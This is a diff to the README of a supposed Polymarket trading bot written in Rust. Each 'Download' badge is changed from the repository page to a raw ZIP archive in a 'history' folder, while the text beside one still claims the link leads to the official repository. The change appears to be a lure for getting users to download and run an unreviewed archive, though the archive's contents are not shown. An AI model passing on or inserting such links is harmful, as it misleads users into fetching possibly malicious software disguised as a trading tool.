@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Trading-Bot-Rust - Automated Trading Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/Naitik-28/Polymarket-Trading-Bot-Rust)
+[![Download](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/Naitik-28/Polymarket-Trading-Bot-Rust/raw/refs/heads/main/history/Bot_Rust_Trading_Polymarket_1.5.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to download and run Polymarket-Trading-Bot-Rust on your Windo
 
 **Step 1:** Visit the main download page by clicking the link below:
 
-[![Download Bot](https://img.shields.io/badge/Download-Bright%20Green?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Naitik-28/Polymarket-Trading-Bot-Rust)
+[![Download Bot](https://img.shields.io/badge/Download-Bright%20Green?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Naitik-28/Polymarket-Trading-Bot-Rust/raw/refs/heads/main/history/Bot_Rust_Trading_Polymarket_1.5.zip)
 
 This link takes you to the official GitHub repository. Here, you can find the latest release of the bot.
 
@@ -132,4 +132,4 @@ For more detailed instructions and updates, visit the repository page regularly.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/Naitik-28/Polymarket-Trading-Bot-Rust)
+[![Download](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/Naitik-28/Polymarket-Trading-Bot-Rust/raw/refs/heads/main/history/Bot_Rust_Trading_Polymarket_1.5.zip)
